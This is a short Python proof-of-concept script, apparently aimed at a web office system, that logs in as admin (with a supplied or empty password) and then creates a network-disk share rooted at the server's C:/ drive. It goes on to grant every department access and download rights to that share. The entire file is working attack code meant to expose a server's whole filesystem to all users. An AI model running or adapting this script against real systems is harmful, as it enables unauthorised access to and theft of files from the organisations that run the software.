# -*- coding: utf-8 -*-

import requests, sys, argparse, re, base64



def createNas(url, username='admin', password=''):
    r = requests.Session()
    r.post(url + '/logincheck.php', data={'UNAME':'admin','PASSWORD': password,'encode_type':'1'}, timeout=10)
    # 创建共享目录
    r.post(url + '/general/system/netdisk/new/submit.php',
           data={'DISK_NO': '87', 'DISK_ID': '88', 'DISK_NAME': 'test', 'DISK_PATH': 'C:/', 'SPACE_LIMIT': '0',
                 'ORDER_BY': 'nom', 'asc_desc': '0'})

    # 获得新建共享目录DISK_ID值
    a = r.get(url + '/general/system/netdisk').text
    # print(a)
    b = re.findall('DISK_ID=(\d+?)&', a)
    b.sort(key=int)
    DISK_ID = b[-1]

    # 设置共享目录访问权限
    r.post(url + '/general/system/netdisk/set_priv/user_submit.php',
           data={'TO_ID': 'ALL_DEPT', 'TO_NAME': '%C8%AB%CC%E5%B2%BF%C3%C5', 'PRIV_ID': '', 'PRIV_NAME': '',
                 'COPY_TO_ID': '', 'COPY_TO_NAME': '', 'DISK_ID': DISK_ID, 'FIELD_NAME': 'USER_ID'})

    # 设置共享目录下载权限
    r.post(url + '/general/system/netdisk/set_priv/user_submit.php',
           data={'TO_ID': 'ALL_DEPT', 'TO_NAME': '%C8%AB%CC%E5%B2%BF%C3%C5', 'PRIV_ID': '', 'PRIV_NAME': '',
                 'COPY_TO_ID': '', 'COPY_TO_NAME': '', 'DISK_ID': DISK_ID, 'FIELD_NAME': 'DOWN_USER'})

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="example python poc.py -u http://baidu.com -p 123456")
    parser.add_argument("-p", "--password")
    args = parser.parse_args()
    url = args.url.strip('/')
    if args.password:
        password = args.password
        password = base64.b64encode(password.encode('utf-8')).decode('utf-8')
    else:
        password = ''
    print(url)
    createNas(url, username='admin', password=password)
